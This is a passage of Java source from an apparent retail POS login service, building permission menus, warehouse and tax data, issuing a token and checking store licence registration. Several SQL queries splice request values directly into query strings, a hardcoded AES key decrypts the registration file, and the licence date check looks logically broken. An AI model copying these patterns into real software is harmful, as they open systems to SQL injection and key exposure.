							List<Map<String, Object>> getQHeader=MapDistinct.getMap(getQDataDetail, condition);
							
							oneLv1.setMyPower(new ArrayList<DCP_LoginRetailRes.level2Powers>());
							
							
							//**********************
							//**DCP_MODULAR要分3级处理**
							//**********************
							
							/////////////////////////////////////////////////////////////////////////////
							//一级菜单
							Map<String, Object> map_condition = new HashMap<String, Object>(); //查詢條件
							map_condition.put("MODULARLEVEL", "1");
							List<Map<String, Object>> getQHeader1=MapDistinct.getWhereMap(getQHeader,map_condition,true);
							
							for (Map<String, Object> oneData3 : getQHeader1)
							{
								DCP_LoginRetailRes.level2Powers oneLv2Power = res.new level2Powers();
								
								String modularNO = oneData3.get("MODULARNO").toString();
								String modularName = oneData3.get("MODULARNAME").toString();
								String modularLevel = oneData3.get("MODULARLEVEL").toString();
								String upModularNO = oneData3.get("UPMODULARNO").toString();
								String isCollection = oneData3.get("ISCOLLECTION").toString();
								String mProName = oneData3.get("MPRONAME").toString();
								if(request.getLangType().equals("zh_TW"))
								{
									mProName =ZHConverter.convert(mProName,0);
								}
								String mftype = oneData3.get("MFTYPE").toString();
								String mparameter = oneData3.get("MPARAMETER").toString();
								String isMask     = oneData3.get("ISMASK").toString();
								
								//模块编码
								Map<String, Object> modularno_condition = new HashMap<String, Object>(); //查詢條件		
								
								oneLv2Power.setModularNo(modularNO);
								oneLv2Power.setModularName(modularName);
								oneLv2Power.setModularLevel(modularLevel);
								oneLv2Power.setUpModularNo(upModularNO);
								oneLv2Power.setIsCollection(isCollection);
								if("4".equals(mftype)) {
									oneLv2Power.setSysReportURL(statementURL); //自建报表地址
								}else {
									oneLv2Power.setSysReportURL(sysReportURL); //帆软报表地址
								}
								
								oneLv2Power.setProName(mProName);
								oneLv2Power.setMftype(mftype);
								oneLv2Power.setIsMask(isMask);
								
								oneLv2Power.setDatas(new ArrayList<DCP_LoginRetailRes.lv_Func>());
								//							oneLv2Power.setChildren(new ArrayList<LoginRetailRes.lv2_modular>());
								
								oneLv2Power.setChildren(new ArrayList<DCP_LoginRetailRes.level2Powers>());
								
								//							//添加一级菜单的func
								for (Map<String, Object> fstFuncDatas : getQHeader)
								{
									//过滤属于此单头的明细
									if(modularNO.equals(fstFuncDatas.get("MODULARNO")) == false)
										continue;
									//在这里过滤除属于第一级的func
									//								ModularGetDCPRes.function fstFunc = new ModularGetDCPRes.function();
									DCP_LoginRetailRes.lv_Func fstFunc = res.new lv_Func();
									
									String funcNO = fstFuncDatas.get("FUNCNO").toString();
									if(funcNO.trim().equals("")) continue;//过滤掉空值
									
									String funName = fstFuncDatas.get("FUNNAME").toString();
									String PowerType = fstFuncDatas.get("POWERTYPE").toString();
									String fProName = fstFuncDatas.get("FPRONAME").toString();
									if(request.getLangType().equals("zh_TW"))
									{
										fProName =ZHConverter.convert(fProName,0);
									}
									
									fstFunc.setFunctionNo(funcNO);
									fstFunc.setFunctionName(funName);
									fstFunc.setPowerType(PowerType);
									fstFunc.setProName(fProName);
									
									oneLv2Power.getDatas().add(fstFunc);
									//								oneLv2Power.getFunction().add(fstFunc);
									
								}//添加一级菜单func结束
								
								setChildrenDatas(oneLv2Power,getQDataDetail, request.getLangType());
								oneLv1.getMyPower().add(oneLv2Power);
								
							}
							map_condition=null;
							getQHeader1=null;
							getQHeader=null;
							
						}
						
						getQDataDetail=null;
						//新增是否可显示配送价 BY JZMA 2019/7/16
						oneLv1.setIsShowDistriPrice(isShowDistriPrice);
						oneLv1.setDisc(disc);



						//增加mes仓库
                        oneLv1.setMyWarehouse(new ArrayList<>());
						String sql_mes_platformstaff_warehouse="select a.*,b.warehouse_name,c.org_name from MES_PLATFORM_STAFFS_WAREHOUSE a " +
								"left join dcp_warehouse_lang b on a.eid=b.eid and a.warehouseno=b.warehouse and b.lang_type='"+req.getLangType()+"'  and a.organization=b.organizationno   " +
								"left join dcp_org_lang c on a.eid=c.eid and a.organization=c.organizationno and c.lang_type='"+req.getLangType()+"' " +
								"where a.eid='"+req.getRequest().geteId()+"' and a.opno='"+req.getRequest().getOpNo()+"' ";
						List<Map<String, Object>> getData_meswarehouse = this.doQueryData(sql_mes_platformstaff_warehouse, null);
						if (getData_meswarehouse != null && getData_meswarehouse.size()>0)
						{
							for (Map<String, Object> meswhMap : getData_meswarehouse)
							{
								DCP_LoginRetailRes.levelwarehouseElm lvmesWh=res.new levelwarehouseElm();
								lvmesWh.setWarehouseNo(meswhMap.get("WAREHOUSENO").toString());
								lvmesWh.setIsDefault(meswhMap.get("ISDEFAULT").toString());
								lvmesWh.setWarehouseName(meswhMap.get("WAREHOUSE_NAME").toString());
								lvmesWh.setOrganizationNo(meswhMap.get("ORGANIZATION").toString());
								lvmesWh.setOrganizationName(meswhMap.get("ORG_NAME").toString());
								oneLv1.getMyWarehouse().add(lvmesWh);
							}
						}

                        if(Check.NotNull(oneLv1.getOrganizationNo())){
                            StringBuffer sb=new StringBuffer("select a.corp,b.org_name as corpname,b1.TAXPAYER_TYPE,b1.OUTPUTTAX as outPutTaxCode,b1.INPUT_TAXCODE as inputTaxCode," +
                                    " c.taxrate as outputtaxrate,d.taxrate as inputtaxrate,e.taxname as outputtaxname,f.taxname as inputtaxname,d.taxcaltype as inputtaxcaltype,d.incltax as inputtaxincltax,c.taxcaltype as outputtaxcaltype ,c.incltax as outputtaxincltax " +
                                    " from dcp_org a " +
                                    " left join dcp_org_lang b on a.eid=b.eid and a.corp=b.organizationno and b.lang_type='"+req.getRequest().getLangType()+"'" +
                                    " left join dcp_org b1 on a.eid=b1.eid and a.corp=b1.organizationno" +
                                    " left join DCP_TAXCATEGORY c on c.eid=b1.eid and c.taxcode=b1.outputtax and c.taxarea='CN' " +
                                    " left join DCP_TAXCATEGORY d on d.eid=b1.eid and d.taxcode=b1.input_taxcode and d.taxarea='CN' " +

									" left join DCP_TAXCATEGORY_lang e on e.eid=b1.eid and e.taxcode=b1.outputtax and e.taxarea='CN' and e.lang_type='"+langType+"' " +
									" left join DCP_TAXCATEGORY_lang f on f.eid=b1.eid and f.taxcode=b1.input_taxcode and f.taxarea='CN' and f.lang_type='"+langType+"' " +

                                    " where a.eid='"+req.getRequest().geteId()+"' and a.organizationno='"+oneLv1.getOrganizationNo()+"' ");
                            List<Map<String, Object>> getData_corp = this.doQueryData(sb.toString(), null);
                            if(getData_corp!=null && getData_corp.size()>0)
                            {
                                oneLv1.setCorp(getData_corp.get(0).get("CORP").toString());
                                oneLv1.setCorpName(getData_corp.get(0).get("CORPNAME").toString());
                                oneLv1.setTaxPayerType(getData_corp.get(0).get("TAXPAYER_TYPE").toString());
                                oneLv1.setOutputTaxCode(getData_corp.get(0).get("OUTPUTTAXCODE").toString());
                                oneLv1.setInputTaxCode(getData_corp.get(0).get("INPUTTAXCODE").toString());
                                oneLv1.setOutputTaxRate(getData_corp.get(0).get("OUTPUTTAXRATE").toString());
                                oneLv1.setInputTaxRate(getData_corp.get(0).get("INPUTTAXRATE").toString());
								oneLv1.setInputTaxName(getData_corp.get(0).get("INPUTTAXNAME").toString());
								oneLv1.setOutputTaxName(getData_corp.get(0).get("OUTPUTTAXNAME").toString());
								oneLv1.setInputTaxCalType(getData_corp.get(0).get("INPUTTAXCALTYPE").toString());
								oneLv1.setInputTaxInclTax(getData_corp.get(0).get("INPUTTAXINCLTAX").toString());
								oneLv1.setOutputTaxCalType(getData_corp.get(0).get("OUTPUTTAXCALTYPE").toString());
								oneLv1.setOutputTaxInclTax(getData_corp.get(0).get("OUTPUTTAXINCLTAX").toString());
                            }
                        }



						res.getDatas().add(oneLv1);
						res.setViewAbleDay(viewAbleDay);
						//
						oneLv1=null;
						
						//System.out.println(res.getDatas().get(0).getOpNO());
						
						TokenManagerRetail tmr=new TokenManagerRetail();
						String token = tmr.produce(res);
						tmr=null;
						
						//System.out.println("token值1		"+token);
						res.setToken(token);
						
					}
					else
					{
						//密码错误
						throw new SPosCodeException(CODE_EXCEPTION_TYPE.E401_2, "密码错误");
					}
				}
			} else {
				logger.info("\r\nlogin sql:"+sql);
				throw new SPosCodeException(CODE_EXCEPTION_TYPE.E401_1, "用户查询失败，请确认管辖门店是否生效 ");
			}
		} else {
			logger.info("\r\nlogin sql:"+sql);
			throw new SPosCodeException(CODE_EXCEPTION_TYPE.E401_1, "用户不存在");
		}
		
		
		//这里判断一下登录的门店是否数量满足注册的数量，读取一下本地的文件
		String path= System.getProperty("user.dir")+"\\Register\\"+"Register.txt";
		File file =new File(path);
		
		int rcount=0;
		if(file.exists()) {
			long filelength=file.length();
			byte[] filecontent=new byte[(int) filelength];
			FileInputStream in =new FileInputStream(file);
			in.read(filecontent);
			in.close();
			
			
			
			String outfile=new String(filecontent, StandardCharsets.UTF_8);
			//JSON转OBJ,先解密一下
			EncryptUtils eu = new EncryptUtils();
			String AES_Key_Register = "DigiwinPosmpcfx5";
			outfile=eu.decodeAES256(AES_Key_Register,outfile);
			DCP_RegisterRes reg = pj.jsonToBean(outfile, new TypeToken<DCP_RegisterRes>(){});
			//正式区数量
			rcount= Integer.parseInt(reg.getTOT_Count());
			for (DCP_RegisterRes.level1 detailtemp : reg.getDatas())
			{
				if(detailtemp.getRegisterType().equals("1"))
				{
					String bedate=detailtemp.getBDate();
					String edate=detailtemp.getEDate();
					String scount=detailtemp.getSCount();
					//判断一下日期,日期可以直接用当前日期转换成int去比较
					String sdate=new SimpleDateFormat("yyyyMMdd").format(Calendar.getInstance().getTime());
					int isdate=Integer.parseInt(sdate);
					int ibddate=Integer.parseInt(bedate);
					int sedate=Integer.parseInt(edate);
					if(isdate>=ibddate&&ibddate<=sedate)
					{
						rcount+=Integer.parseInt(scount);
					}
				}
			}
			eu=null;
			
		}
		
		if(res.getDatas().get(0).getShopId().isEmpty()||res.getDatas().get(0).getShopId().equals("")) {
			throw new SPosCodeException(CODE_EXCEPTION_TYPE.E401_1, "管辖门店未设置！");
		}
		
		//开始启用新注册验证
		if((sORG_FORM.equals("0")||res.getDatas().get(0).getDisCentre().equals("Y"))
				&&!opNO.equalsIgnoreCase("admin")) {
			//公司的，需要验证云中台是否注册
			//			Preferences pre = Preferences.systemRoot().node("digiwin");
			//			Preferences  test = pre.node("digiwinsoft");
			//			String machinecode= test.get("digiwincode", "");
			//			
			//			//取得硬件信息
			//			String scpu=Register.getCPUSerial();
			//		  String sHardDisk=Register.getHardDiskSN("c");
			//		  String scouputername=Register.getcomputername();
			//		  String sMotherboard=Register.getMotherboardSN();
			//		  String smac=Register.getMac();
			//取得安装目录
			File f = new File(this.getClass().getResource("/").getPath());
			String spath=f.toString();
			
			DCP_CRegisterCheckReq reqregister=new DCP_CRegisterCheckReq();
			reqregister.setServiceId("DCP_CRegisterCheck");
			
			DCP_CRegisterCheckReq.levelElm level = new DCP_CRegisterCheckReq().new levelElm();
			level.setrEId(res.getDatas().get(0).geteId());
			level.setrShopId(res.getDatas().get(0).getShopId());
			level.setProducttype("90101");//IBP
			reqregister.setRequest(level);
			String jsontemp= pj.beanToJson(reqregister);
			
			//直接调用CRegisterDCP服务
			DispatchService ds = DispatchService.getInstance();
			String resXml = ds.callService(jsontemp, StaticInfo.dao);
			DCP_CRegisterCheckRes resserver=pj.jsonToBean(resXml, new TypeToken<DCP_CRegisterCheckRes>(){});
			if(resserver.isSuccess()==false)
			{
				throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, "智慧平台总部基础模块未注册！");
			}
			
			
		}
		//		if(sORG_FORM.equals("2")&&!opNO.toLowerCase().equals("admin"))
		
		String postype="1";
		if(StaticInfo.psc.getPos_Type()!=null) {
			postype=StaticInfo.psc.getPos_Type().getValue();
		}
		
		if(sORG_FORM.equals("2") && !res.getDatas().get(0).getDisCentre().equals("Y")) {
			if(postype != null && postype.equals("2"))
			{} else {
				DCP_CRegisterCheckReq reqregister= new DCP_CRegisterCheckReq();
				reqregister.setServiceId("DCP_CRegisterCheck");
				
				levelElm lvReq = reqregister.new levelElm();
				
				lvReq.setProducttype("1");
				reqregister.setRequest(lvReq);
//				reqregister.getRequest().setProducttype("1");
				if(loginType!=null && loginType.equals("2"))
				{
					//移动门店注册验证使用
					reqregister.getRequest().setProducttype("7");
				}
				
				reqregister.getRequest().setrEId(res.getDatas().get(0).geteId());
				reqregister.getRequest().setrShopId(res.getDatas().get(0).getShopId());
				String jsontemp= pj.beanToJson(reqregister);
				//直接调用CRegisterDCP服务
				DispatchService ds = DispatchService.getInstance();
				String resXml = ds.callService(jsontemp, StaticInfo.dao);
				DCP_CRegisterCheckRes resserver=pj.jsonToBean(resXml, new TypeToken<DCP_CRegisterCheckRes>(){});
				if(resserver.isSuccess()==false)
				{
					//通过管辖门店判断是否注册  BY JZMA 20200228
					boolean isRegister=false;
					for (DCP_LoginRetailRes.level2Shops par: res.getDatas().get(0).getMyShops())
					{
						String shopId = par.getOrgNo();
						reqregister.getRequest().setrEId(res.getDatas().get(0).geteId());
						reqregister.getRequest().setrShopId(shopId);
						jsontemp= pj.beanToJson(reqregister);
						//直接调用CRegisterDCP服务
						ds = DispatchService.getInstance();
						resXml = ds.callService(jsontemp, StaticInfo.dao);
						resserver=pj.jsonToBean(resXml, new TypeToken<DCP_CRegisterCheckRes>(){});
						if(resserver.isSuccess())
						{
							isRegister=true;
							break;
						}
					}
					if(isRegister==false)
					{
						throw new SPosCodeException(CODE_EXCEPTION_TYPE.E401_1, "门店号:"+res.getDatas().get(0).getShopId()+"未注册!");
						
					}
				}
			}
		}
		LSC=null;
		String sJsonLogin=pj.beanToJson(res);
		res=null;
		pj=null;
		
		return sJsonLogin;
	}
	
	@Override
	protected DCP_LoginRetailRes processJson(DCP_LoginRetailReq req) throws Exception {
		return null;
	}
	
	@Override
	protected void processRow(Map<String, Object> row) throws Exception {
	}
	
	@Override
	protected String getQuerySql(DCP_LoginRetailReq req) throws Exception {
		return null;
	}
	
	//这里写一个递归的调用当前的方法
	protected void setChildrenDatas(DCP_LoginRetailRes.level2Powers oneLv2,List<Map<String, Object>> allMenuDatas,String langType) throws Exception {
		try {
			List<Map<String, Object>> upModularList = getChildDatas(allMenuDatas,oneLv2.getModularNo());
			// 主键字段
			Map<String, Boolean> condition = new HashMap<String, Boolean>(); //查詢條件
			condition.put("MODULARNO", true);
			//调用过滤函数
			List<Map<String, Object>> upModularList2=MapDistinct.getMap(upModularList, condition);
			
			
			if(upModularList2 != null && !upModularList2.isEmpty()) {
				for (Map<String, Object> menuDatas : upModularList2) {
					DCP_LoginRetailRes.level2Powers lv1=new DCP_LoginRetailRes().new level2Powers();
					lv1.setChildren(new ArrayList<DCP_LoginRetailRes.level2Powers>());
					lv1.setDatas(new ArrayList<DCP_LoginRetailRes.lv_Func>());
					
					String modularNO = menuDatas.get("MODULARNO").toString();
					String modularName = menuDatas.get("MODULARNAME").toString();
					String modularLevel = menuDatas.get("MODULARLEVEL").toString();
					String upModularNO = menuDatas.get("UPMODULARNO").toString();
					String isCollection = menuDatas.get("ISCOLLECTION").toString();
					String mProName = menuDatas.get("MPRONAME").toString();
					if(langType.equals("zh_TW")) {
						mProName =ZHConverter.convert(mProName,0);
					}
					String mftype = menuDatas.get("MFTYPE").toString();
					String mparameter = menuDatas.get("MPARAMETER").toString();
					String isMask = menuDatas.get("ISMASK").toString();
					
					//模块编码
					lv1.setModularNo(modularNO);
					lv1.setModularName(modularName);
					lv1.setModularLevel(modularLevel);
					lv1.setUpModularNo(upModularNO);
					lv1.setIsCollection(isCollection);
					if("4".equals(mftype)) {
						lv1.setSysReportURL(statementURL); //自建报表地址
					}else {
						lv1.setSysReportURL(sysReportURL); //帆软报表地址
					}
					lv1.setProName(mProName);
					lv1.setMftype(mftype);
					lv1.setMparameter(mparameter);
					lv1.setIsMask(isMask);
					
					lv1.setDatas(new ArrayList<DCP_LoginRetailRes.lv_Func>());
					//					lv1.setChildren(new ArrayList<LoginRetailRes.lv2_modular>());
					
					lv1.setChildren(new ArrayList<DCP_LoginRetailRes.level2Powers>());
					
					
					for (Map<String, Object> fstFuncDatas : upModularList) {
						if(modularNO.equals(fstFuncDatas.get("MODULARNO")) == false)
							continue;
						//在这里过滤除属于第一级的func
						DCP_LoginRetailRes.lv_Func fstFunc = new DCP_LoginRetailRes().new lv_Func();
						
						String funcNO = fstFuncDatas.get("FUNCNO").toString();
						if(funcNO.trim().equals(""))
							continue;//过滤掉空值
						
						String funName = fstFuncDatas.get("FUNNAME").toString();
						String PowerType = fstFuncDatas.get("POWERTYPE").toString();
						String fProName = fstFuncDatas.get("FPRONAME").toString();
						
						fstFunc.setFunctionNo(funcNO);
						fstFunc.setFunctionName(funName);
						fstFunc.setPowerType(PowerType);
						fstFunc.setProName(fProName);
						
						lv1.getDatas().add(fstFunc);
						
					}//添加菜单func结束
					
					setChildrenDatas(lv1,allMenuDatas,langType);
					oneLv2.getChildren().add(lv1);
					
					lv1=null;
				}
				
			}
			
			upModularList2=null;
			upModularList=null;
			
		} catch (Exception ignored) {
			logger.error("系统登入异常",ignored);
		}
		
	}
	
	protected List<Map<String, Object>> getChildDatas (List<Map<String, Object>> allMenuDatas,String modularNO) {
		List<Map<String, Object>> menuDataTemp =new ArrayList<>();
		for (Map<String, Object> map : allMenuDatas) {
			if(map.get("UPMODULARNO").toString().equals(modularNO)) {
				menuDataTemp.add(map);
			}
		}
		return menuDataTemp;
	}


	public String getOrgSql(DCP_LoginRetailReq req){
		String sql="";
		sql="select DISTINCT a.ORGANIZATIONNO,a.SNAME,b.UP_ORG,c.ORG_NAME,a.ORG_FORM,a.DISCENTRE,d.ISDEFAULT " +
				" from DCP_ORG a " +
				" left join DCP_ORG_LEVEL b on a.EID=b.EID and a.ORGANIZATIONNO=b.ORGANIZATIONNO " +
				" LEFT JOIN DCP_ORG_LANG c ON a.EID=c.EID AND a.ORGANIZATIONNO=c.ORGANIZATIONNO AND c.LANG_TYPE='"+req.getLangType()+"'"+
		        " LEFT JOIN platform_staffs_shop d on d.shopid=a.organizationno and a.eid=d.eid " +
				" where a.eid='"+req.geteId()+"' and a.status='100'" ;


		return sql;
	}

	public void expendChildren(DCP_LoginRetailRes.level1Elm level1Elm, DCP_LoginRetailRes.level2Shops org,List<Map<String, Object>> allOrgList){
		String forg = org.getOrgNo();
		DCP_StaffQueryRes res =new DCP_StaffQueryRes();

		for(Map<String, Object> map : allOrgList){
			Object up_org = map.get("UP_ORG");
			if(up_org!=null&&forg.equals(up_org.toString())){
				DCP_LoginRetailRes.level2Shops child =new DCP_LoginRetailRes().new level2Shops();
                child.setOrgNo((String)map.get("ORGANIZATIONNO"));
				child.setOrgName((String)map.get("ORG_NAME"));
                String isDefault=child.getOrgNo().equals(level1Elm.getDefaultOrg())?"Y":"N";
                child.setOrg_Form((String)map.get("ORG_FORM"));
				child.setIsDefault(isDefault);
				child.setDisCentre((String)map.get("DISCENTRE"));

				//child.setChildren(new ArrayList<>());
				List<DCP_LoginRetailRes.level2Shops> filterRows = level1Elm.getMyShops().stream().filter(x -> x.getOrgNo().equals(child.getOrgNo())).collect(Collectors.toList());
				if(filterRows.size()<=0){
					//有嵌套的就会多次添加，所以需要过滤一下
					level1Elm.getMyShops().add(child);
				}
				//搜寻下展组织和本身没关系
				expendChildren(level1Elm,child,allOrgList);
				//org.getChildren().add(child);
			}
		}

	}


	/**
	 * 微信 数据解密<br/>
	 * 对称解密使用的算法为 AES-128-CBC，数据采用PKCS#7填充<br/>
	 * 对称解密的目标密文:encrypted=Base64_Decode(encryptData)<br/>
	 * 对称解密秘钥:key = Base64_Decode(session_key),aeskey是16字节<br/>
	 * 对称解密算法初始向量:iv = Base64_Decode(iv),同样是16字节<br/>
	 * @param encrypted 目标密文
	 * @param session_key 会话ID
	 * @param iv 加密算法的初始向量
	 */
	protected  String wxDecrypt(String encrypted, String session_key, String iv) {
		String json = null;
		byte[] encrypted64 = Base64.decodeBase64(encrypted);
		byte[] key64 = Base64.decodeBase64(session_key);
		byte[] iv64 = Base64.decodeBase64(iv);
		byte[] data;
		try {
			init();
			json = new String(decrypt(encrypted64, key64, generateIV(iv64)));
		} catch (Exception ignored) {
		
		}
		return json;
	}
	
	/**
	 * 初始化密钥
	 */
	protected  void init() throws Exception {
		Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
		KeyGenerator.getInstance(KEY_NAME).init(128);
	}
	
	/**
	 * 生成iv
	 */
	protected  AlgorithmParameters generateIV(byte[] iv) throws Exception {
		// iv 为一个 16 字节的数组，这里采用和 iOS 端一样的构造方法，数据全为0
		// Arrays.fill(iv, (byte) 0x00);
		AlgorithmParameters params = AlgorithmParameters.getInstance(KEY_NAME);
		params.init(new IvParameterSpec(iv));
		return params;
	}
	
	/**
	 * 生成解密
	 */
	protected  byte[] decrypt(byte[] encryptedData, byte[] keyBytes, AlgorithmParameters iv) throws Exception {
		Key key = new SecretKeySpec(keyBytes, KEY_NAME);
		Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);
		// 设置为解密模式
		cipher.init(Cipher.DECRYPT_MODE, key, iv);
		return cipher.doFinal(encryptedData);
	}

    public String getQueryDefaultShopSql(String eId,String opNO,String langType) throws Exception {
        String sql = null;
        StringBuffer sqlbuf = new StringBuffer();
        sqlbuf.append(""
                + " select OPNO,SHOPID,SHOPNAME,in_cost_warehouse,in_non_cost_warehouse,"
                + " out_cost_warehouse,out_non_cost_warehouse,inv_cost_warehouse,inv_non_cost_warehouse,CITY,DISTRICT,"
                + " in_cost_warehouseName,in_non_cost_warehouseName, out_cost_warehouseName,"
                + " out_non_cost_warehouseName,inv_cost_warehouseName,inv_non_cost_warehouseName ,ORG_FORM,ENABLECREDIT"
                + ",case when ORG_FORM='0'  THEN SHOPID ELSE BELFIRM END AS BELFIRM "
                + ",case when ORG_FORM='0'  THEN SHOPNAME ELSE BELFIRM_NAME END AS BELFIRM_NAME "
                //2019-05-15  加上 isDefault 字段， 是否默认组织
                + " ,isDefault ,DISCENTRE,org_type,ISEXPAND, return_cost_warehouse,return_cost_warehousename  "
                + " from ("
                + "select a.DEFAULTORG SHOPID,c.org_name  SHOPNAME,a.opno OPNO,"
                + " c.in_cost_warehouse,c.in_non_cost_warehouse,c.out_cost_warehouse,"
                + " c.out_non_cost_warehouse,c.inv_cost_warehouse,c.inv_non_cost_warehouse,c.CITY,c.DISTRICT,"
                + " d.warehouse_name as in_cost_warehouseName, e.warehouse_name as in_non_cost_warehouseName,f.warehouse_name as out_cost_warehouseName,"
                + " g.warehouse_name as out_non_cost_warehouseName,h.warehouse_name as inv_cost_warehouseName,i.warehouse_name as inv_non_cost_warehouseName,"
				+ " j.warehouse_name as return_cost_warehouseName,c.return_cost_warehouse,"
				+ " c.ORG_FORM as ORG_FORM,c.ENABLECREDIT ,c.BELFIRM,c.BELFIRM_NAME,C.DISCENTRE,'Y' AS isDefault,c.org_type,'N' AS ISEXPAND"
                //2019-05-15  加上 isDefault 字段， 是否默认组织
                + " from platform_staffs a "
                + " left join dcp_org_lang b ON a.DEFAULTORG=b.organizationno and a.eid=b.eid  and b.LANG_TYPE='"+langType+"' "

                + " inner join "
                + " (SELECT A.eid,A.ORGANIZATIONNO SHOPID,NVL(B.ORG_NAME,A.SNAME) AS ORG_NAME ,"
                + " A.in_cost_warehouse,A.in_non_cost_warehouse,A.out_cost_warehouse,A.out_non_cost_warehouse,A.inv_cost_warehouse,"
                + " A.inv_non_cost_warehouse,a.RETURN_COST_WAREHOUSE,"
                + " A.STATUS,A.ENABLECREDIT,A.CITY,A.COUNTY DISTRICT,A.ORG_FORM,A.BELFIRM,BB.ORG_NAME AS BELFIRM_NAME,A.DISCENTRE,a.org_type"
                + " FROM dcp_ORG A "
                + " LEFT JOIN DCP_ORG_LANG B ON A.eid=B.eid AND A.ORGANIZATIONNO=B.ORGANIZATIONNO AND B.LANG_TYPE='"+langType+"' "
                + " AND B.status='100' "
                + " LEFT JOIN DCP_ORG_LANG BB ON A.eid=BB.eid AND A.BELFIRM =BB.ORGANIZATIONNO AND BB.LANG_TYPE = '"+langType+"' "
                + " AND BB.status='100' "
                + " WHERE A.eid='"+eId+"' AND (A.ORG_FORM='0' OR A.ORG_FORM='2') AND A.status='100' "
                + " ) c on a.DEFAULTORG=c.SHOPID and a.eid=c.eid "


                + " left join DCP_warehouse_lang d on c.in_cost_warehouse=d.warehouse and a.eid=d.eid AND c.SHOPID=d.ORGANIZATIONNO AND d.lang_type=b.lang_type "
                + " left join DCP_warehouse_lang e on c.in_non_cost_warehouse=e.warehouse and a.eid=e.eid AND c.SHOPID=e.ORGANIZATIONNO AND e.lang_type=b.lang_type "
                + " left join DCP_warehouse_lang f on c.out_cost_warehouse=f.warehouse and a.eid=f.eid AND c.SHOPID=f.ORGANIZATIONNO AND f.lang_type=b.lang_type "
                + " left join DCP_warehouse_lang g on c.out_non_cost_warehouse=g.warehouse and a.eid=g.eid AND c.SHOPID=g.ORGANIZATIONNO AND g.lang_type=b.lang_type "
                + " left join DCP_warehouse_lang h on c.inv_cost_warehouse=h.warehouse and a.eid=h.eid AND c.SHOPID=h.ORGANIZATIONNO AND h.lang_type=b.lang_type "
                + " left join DCP_warehouse_lang i on c.inv_non_cost_warehouse=i.warehouse and a.eid=i.eid AND c.SHOPID=i.ORGANIZATIONNO AND i.lang_type=b.lang_type "
				+ " left join DCP_warehouse_lang j on c.return_cost_warehouse=j.warehouse and a.eid=j.eid AND c.SHOPID=j.ORGANIZATIONNO AND j.lang_type=b.lang_type "
				+ " where a.STATUS='100' and (c.STATUS='100' or c.STATUS is null )  "
                + " AND A.eid='"+eId+"' "
                + " AND A.OPNO='"+opNO+"' "
                + " ) order by org_form ,SHOPID "
        );

        sql = sqlbuf.toString();

        sqlbuf=null;

        return sql;
    }




}






